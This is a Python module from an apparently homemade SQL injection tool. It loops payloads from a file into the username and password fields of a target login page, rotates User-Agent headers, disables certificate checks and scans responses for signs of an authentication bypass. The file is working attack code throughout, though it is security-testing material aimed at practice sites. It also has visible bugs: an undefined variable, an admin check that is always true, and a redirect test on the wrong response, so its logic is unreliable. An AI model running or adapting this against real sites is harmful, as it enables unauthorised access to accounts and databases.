import os
import sys
import asyncio
import re
import requests
from colorama import Fore,init,Style
from datetime import datetime
import sys
import os
import logging

current_directory = os.getcwd()

sys.path.append(current_directory)


attack_type = "authentication bypass SQL injection"
from lib.scripts.headers import Prepare_the_headers
from lib.scripts.headers import headers
from lib.scripts.headers import header
from  lib.regelexpression.patterns import Detect
from lib.priority.Priority import PRIORITY
from lib.priority.Priority import HARMFULL
from logger.logs import logger
from Exceptions.exceptions import SQLJNGInstallationError
from Exceptions.exceptions import SQLJNGOptionError
from Exceptions.exceptions import SQLJNGUserExit
from Exceptions.exceptions import SQLJNGApiError
from Exceptions.exceptions import SQLJNGTimeExpiredError
from lib.Attacktype.Attacks import AttackType
from lib.Stacks.stack import html_response
from lib.result.Results import SQLJNG_result_report
from lib.result.Results import safe_SQLJNG_result
from Exceptions.exceptions import SQLJNGStackRangeError
from lib.SQLJNGDataTypes.Magicdicts import magic_dict
from lib.Attacktype.Attacks import ErrorBasedSQl
from logger.logs import logger as sqljlog



"""
Function: INVALID_HTTP_REQ
Description: Performs invalid HTTP request injection attacks on a target website.

Dependencies:
- os
- sys
- asyncio
- re
- requests
- colorama (Fore, init, Style)
- datetime
- sqlite3
- headers (from headers import *)
- logging

Note:
- The payloads for invalid HTTP requests are sourced from the 'errorHTTPreq.txt' file.
- The headers for HTTP requests are inspired by https://stackoverflow.com/questions/70017732/how-to-change-the-ip-address-in-the-url.
- The 'headers' module is required for user-agent settings (imported from headers import *).
- Logging is configured to store information in the 'SQLJ.log' file.

Usage:
1. Import the necessary libraries and dependencies.
2. Use the 'INVALID_HTTP_REQ(urls)' function to perform invalid HTTP request injection attacks on the specified URLs.

Example:
```python
from sql_injection_exploit import INVALID_HTTP_REQ

urls_to_attack = ["http://example.com/login", "http://testsite.net/login"]
for url in urls_to_attack:
    asyncio.run(INVALID_HTTP_REQ(url))
"""


__pririority__ = PRIORITY.HIGH
__harmfull__ = HARMFULL.HIGH
__Attack__ = AttackType.INVALIDHTTP_REQ


pattern = r"\berror\b"
htmlpattern = r"\bid\b"
capturesAUTHBYPASS = []
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'
}

"""Reference:https://sqlwiki.netspi.com/injectionTypes/errorBased/#oracle """




async def INVALID_HTTP_REQ(urls):
    """This is the authentication bypass sql injection block. it occurs when the input datas are not validated and attacker can inject its own code to the database and bypass the authentication"""
    try:
        """This is the main block of our exploit program which sending the payloads. """
        global pattern,htmlpattern  
        done = False 
        filename = "errorHTTPreq.txt"
        current_directory = os.path.dirname(os.path.abspath(__file__)) 
        file_path = os.path.join(current_directory, filename) 

        with open(file_path, "r") as file: 
            payload = file.read()
            rows = payload.split("\n") 
            sorted_rows = sorted(rows) 
            sorted_payload = "\n".join(sorted_rows) #* 
            logger.info(f"Payload is ready to be send:{line}")
            requests.packages.urllib3.disable_warnings()  #! Disable SSL warnings for http requests and testing
            # url = "https://redtiger.labs.overthewire.org/level1.php"
            req = requests.get(url=urls,verify=False)

            if req.status_code == 200: 
                ask = input(f"[{datetime.now()}]{Fore.RESET}{Fore.GREEN}{Style.BRIGHT}[INFO]**Looks like the host is up: {Fore.RESET}{Fore.YELLOW}{urls} {Fore.RESET}{Fore.GREEN} \nDo you want to send the payload above to the website?** ")
                msg = "Host is Up%s"%urls
                msg += "Sending payloads above to the website"
                logger.info(msg)
            
                if ask.lower() == "y":
                    sqljlog.info(f"Testing payload:{ErrorBasedSQl.INVALID_HTTP_REQ.value}")
                    for line in sorted_payload.split("\n"): 
                        sqljlog.info(f"Testing:{line if len(line) <50 else line.split("\n")}")

                        params = { 
                            "username": line,
                            "password": line
                        }
                        await Prepare_the_headers()
                        for headerR in headers:
                            ack = requests.post(url=urls, data=params,verify=False,headers={"User-Agent": header}) 
                            logger.info(f"sending payload:{line}")
                            await asyncio.sleep(5) 
                            if "error" in ack.text: 
                                logger.info("Could find error parameter in the response")
                                await asyncio.sleep(3)
                                Detect(ack.text)
                                html_response.push(ack.text)
                                magic_dict.insert_captures_to_dict("error based capture",html_response)

                                
                            vuln = re.findall(pattern=pattern,string=ack.text,flags=re.IGNORECASE) 
                            htmlVULN = re.findall(pattern=htmlpattern,string=ack.text,flags=re.IGNORECASE) 
                            if vuln: 
                                logger.info(f"Could find id parameter in response.")
                                Detect(ack.text)
                                await asyncio.sleep(3)
                                html_response.push(ack.text)
                            
                            if htmlVULN:
                                logger.info(f"Could find error parameter in response.")
                                Detect(ack.text)
                                await asyncio.sleep(3)
                                html_response.push(ack.text)

                            
                            word = "id" in req.text                             
                            errword = "error" in req.text
                            if word:
                                logger.info(f"Could find id parameter in the response.")
                                await asyncio.sleep(3)
                                Detect(ack.text)
                                html_response.push(ack.text)

                            
                            if errword:
                                logger.info(f"Could find error parameter in the response.")
                                await asyncio.sleep(3)
                                Detect(ack.text)
                                html_response.push(ack.text)

                                
                            
                                
                        if req.status_code == 302:                                             
                            logger.info("Could break into the website.")
                        
                        if "Admin" or "admin" in vuln or "Admin" or "admin" in ack.text or "Admin" or "admin" in htmlVULN:
                            logger.info(f"Could find admin parameter in the response.")
                            await asyncio.sleep(3)
                            Detect(ack.text)
                            html_response.push(ack.text)

                            
                else:
                    logger.info(f"Host is down")
            

    
    except requests.exceptions.ConnectionError:
        raise SQLJNGApiError
    
    except requests.exceptions.Timeout:
        raise SQLJNGTimeExpiredError
    
    except KeyboardInterrupt:
        print("Aborted")
    
        

        
    finally:
        logger.info("Done with the injection test.")
        try:
            await SQLJNG_result_report(html_response)
        
        except SQLJNGStackRangeError:
            result = safe_SQLJNG_result(html_response)
            for res in result:
                logger.info(res)
     
        
        
     



# asyncio.run(INVALID_HTTP_REQ("http://testfire.net/login.jsp"))
